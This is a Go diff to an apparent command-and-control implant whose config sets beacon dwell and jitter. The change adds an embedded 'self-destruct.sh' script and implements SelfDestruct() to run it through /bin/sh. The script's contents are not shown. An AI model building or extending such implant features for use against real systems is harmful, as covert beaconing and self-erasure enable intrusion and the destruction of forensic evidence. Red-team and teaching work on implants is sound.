@@ -1,9 +1,8 @@
 package main
 
 import (
-	"asritha.dev/implant/pkg/c2communicator"
-	"asritha.dev/implant/pkg/task"
 	"bytes"
+	_ "embed"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -11,7 +10,14 @@ import (
 	"math/rand"
 	"net/http"
 	"time"
+	"os/exec"
+
+	"asritha.dev/implant/pkg/c2communicator"
+	"asritha.dev/implant/pkg/task"
 )
+
+//go:embed self-destruct.sh
+var selfDestruct string
 
 type ImplantConfig struct {
 	Dwell  string  `json:"dwell"` // base interval time between C2 beacon check-ins (e.g., “5m” for a five-minute dwell before adding jitter)
@@ -181,6 +187,6 @@ func (i *Implant) ExecuteTasks() {
 	}
 }
 
-func (i *Implant) SelfDestruct() {
-
+func (i *Implant) SelfDestruct() error {
+	return exec.Command("/bin/sh", "-c", selfDestruct).Run()
 }
